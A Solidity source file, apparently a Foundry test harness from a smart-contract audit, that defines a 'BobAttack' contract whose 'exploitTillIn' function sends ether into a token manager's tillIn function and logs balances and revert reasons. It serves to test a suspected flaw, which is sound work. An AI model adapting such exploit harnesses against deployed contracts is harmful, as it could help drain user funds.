// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol"; // Assuming usage of Foundry's std library for logging

interface ITokenManager {
    function tillIn(address _accountAddress, address _tokenAddress, uint256 _amount, bool _isPointToken)
        external
        payable;
}

contract BobAttack is Test {
    ITokenManager public tokenManager;
    address public wrappedNativeToken;

    constructor(address _tokenManager, address _wrappedNativeToken) {
        tokenManager = ITokenManager(_tokenManager);
        wrappedNativeToken = _wrappedNativeToken;
    }

    function exploitTillIn(uint256 _amount) external payable {
        require(msg.value == _amount, "Send exact amount to be wrapped");

        // Adding pre-execution logs
        // emit log_named_uint("Amount to tillIn:", _amount);
        // emit log_named_uint("BobAttack balance before:", address(this).balance);
        // emit log_named_uint("TokenManager balance before:", address(tokenManager).balance);

        try tokenManager.tillIn{value: _amount}(address(this), wrappedNativeToken, _amount, false) {
            // Adding post-execution logs
            emit log_named_uint("BobAttack balance after:", address(this).balance);
            emit log_named_uint("TokenManager balance after:", address(tokenManager).balance);
        } catch Error(string memory reason) {
            // Catching revert reasons
            emit log_named_string("Revert reason", reason);
        } catch (bytes memory reason) {
            // Catching revert reasons in bytes
            emit log_named_bytes("Revert reason (bytes)", reason);
        }
    }

    // Function to receive Ether when transferred by TokenManager
    receive() external payable {}
}
